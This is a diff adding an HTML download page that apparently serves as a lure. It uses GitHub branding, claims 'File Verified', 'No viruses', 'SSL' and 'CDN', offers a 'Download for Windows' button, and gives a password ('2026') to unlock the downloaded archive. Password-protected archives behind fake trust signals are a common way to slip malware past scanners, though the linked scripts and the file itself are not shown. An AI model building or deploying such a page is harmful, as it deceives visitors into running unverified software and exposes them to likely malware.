@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Download the Latest Release</title>
+  <meta name="description" content="Preparing a verified GitHub release download." />
+  <meta name="theme-color" content="#070b12" />
+  <link rel="icon" href="./css/favicon.svg?v=2" type="image/svg+xml" />
+  <link rel="stylesheet" href="./css/styles.css?v=20" />
+</head>
+<body>
+  <div class="glow glow-a" aria-hidden="true"></div>
+  <div class="glow glow-b" aria-hidden="true"></div>
+
+  <main class="stage" id="card">
+    <a class="logo" id="repoLink" href="https://github.com" rel="noopener" aria-label="View on GitHub">
+      <svg viewBox="0 0 24 24" aria-hidden="true">
+        <path fill="currentColor" d="M10.226 17.284c-2.965-.36-5.054-2.493-5.054-5.256 0-1.123.404-2.336 1.078-3.144-.292-.741-.247-2.314.09-2.965.898-.112 2.111.36 2.83 1.01.853-.269 1.752-.404 2.853-.404 1.1 0 1.999.135 2.807.382.696-.629 1.932-1.1 2.83-.988.315.606.36 2.179.067 2.942.72.854 1.101 2 1.101 3.167 0 2.763-2.089 4.852-5.098 5.234.763.494 1.28 1.572 1.28 2.807v2.336c0 .674.561 1.056 1.235.786 4.066-1.55 7.255-5.615 7.255-10.646C23.5 6.188 18.334 1 11.978 1 5.62 1 .5 6.188.5 12.545c0 4.986 3.167 9.12 7.435 10.669.606.225 1.19-.18 1.19-.786V20.63a2.9 2.9 0 0 1-1.078.224c-1.483 0-2.359-.808-2.987-2.313-.247-.607-.517-.966-1.034-1.033-.27-.023-.359-.135-.359-.27 0-.27.45-.471.898-.471.652 0 1.213.404 1.797 1.235.45.651.921.943 1.483.943.561 0 .92-.202 1.437-.719.382-.381.674-.718.944-.943"/>
+      </svg>
+    </a>
+
+    <h1 id="title">Download the Latest Release</h1>
+    <p class="lede" id="subtitle">Click the button to download the file<br>For installation, follow the instructions in the archive</p>
+
+    <section class="hub">
+      <div class="verify">
+        <span class="hub-icon" aria-hidden="true">
+          <svg viewBox="0 0 640 512" fill="currentColor" aria-hidden="true"><path d="M144 480C64.5 480 0 415.5 0 336c0-62.8 40.2-116.2 96.2-135.9c-.1-2.7-.2-5.4-.2-8.1c0-88.4 71.6-160 160-160c59.3 0 111 32.2 138.7 80.2C409.9 102 428.3 96 448 96c53 0 96 43 96 96c0 12.2-2.3 23.8-6.4 34.6C596 238.4 640 290.1 640 352c0 70.7-57.3 128-128 128H144zm79-167l80 80c9.4 9.4 24.6 9.4 33.9 0l80-80c9.4-9.4 9.4-24.6 0-33.9s-24.6-9.4-33.9 0l-39 39V184c0-13.3-10.7-24-24-24s-24 10.7-24 24V318.1l-39-39c-9.4-9.4-24.6-9.4-33.9 0s-9.4 24.6 0 33.9z"/></svg>
+        </span>
+        <div class="verify-copy" id="verifyCopy">
+          <p class="verify-title">
+            <span class="badge swap" aria-hidden="true">
+              <span class="line show">
+                <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M3.5 8.2 6.4 11.1 12.5 4.8"/></svg>
+              </span>
+              <span class="line">
+                <svg viewBox="0 0 16 16" fill="currentColor">
+                  <path fill-rule="evenodd" d="M4.2 6.5V5a3.8 3.8 0 0 1 7.6 0v1.5h.7A1.5 1.5 0 0 1 14 8v5a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 2 13V8a1.5 1.5 0 0 1 1.5-1.5h.7Zm2 0h3.6V5a1.8 1.8 0 1 0-3.6 0v1.5Zm.65 4.05a1.15 1.15 0 1 1 1.9.87v1.08h-1.5v-1.08a1.15 1.15 0 0 1-.4-.87Z" clip-rule="evenodd"/>
+                </svg>
+              </span>
+            </span>
+            <span class="swap">
+              <span class="line show" id="status">File Verified</span>
+              <span class="line">Archive password:<b id="passwordValue">2026</b></span>
+            </span>
+          </p>
+          <p class="verify-sub">
+            <span class="swap">
+              <span class="line show" id="ready">Ready to download · Secure connection</span>
+              <span class="line">Required to unlock the downloaded file</span>
+            </span>
+          </p>
+        </div>
+      </div>
+
+      <button class="win" id="primary" type="button">
+        <svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M0 2.3 6.6 1.4v6.1H0Zm7.3-1L16 0v7.5H7.3ZM0 8.5h6.6v6.1L0 13.6Zm7.3.1H16V16l-8.7-1.2Z"/></svg>
+        Download for Windows
+      </button>
+
+      <ul class="trust">
+        <li>
+          <svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 1.2 3 3.1v4.2c0 3.1 2.1 5.2 5 6.5 2.9-1.3 5-3.4 5-6.5V3.1L8 1.2Zm2.6 4.9-3.1 3.1-1.5-1.5-.8.8 2.3 2.3 3.9-3.9-.8-.8Z"/></svg>
+          No viruses
+        </li>
+        <li>
+          <svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M5 7V5a3 3 0 0 1 6 0v2h1.2A1.8 1.8 0 0 1 14 8.8v4.4A1.8 1.8 0 0 1 12.2 15H3.8A1.8 1.8 0 0 1 2 13.2V8.8A1.8 1.8 0 0 1 3.8 7H5Zm1.2 0h3.6V5a1.8 1.8 0 0 0-3.6 0v2Z"/></svg>
+          SSL
+        </li>
+        <li>
+          <svg viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M4.2 11.2h7.7a2.6 2.6 0 0 0 .4-5.1 3.6 3.6 0 0 0-6.9-.7 2.5 2.5 0 0 0-1.2 5.8Z"/></svg>
+          CDN
+        </li>
+      </ul>
+    </section>
+  </main>
+
+  <footer>Hosted on GitHub</footer>
+
+  <script src="./js/config.js"></script>
+  <script src="./js/app.js"></script>
+</body>
+</html>
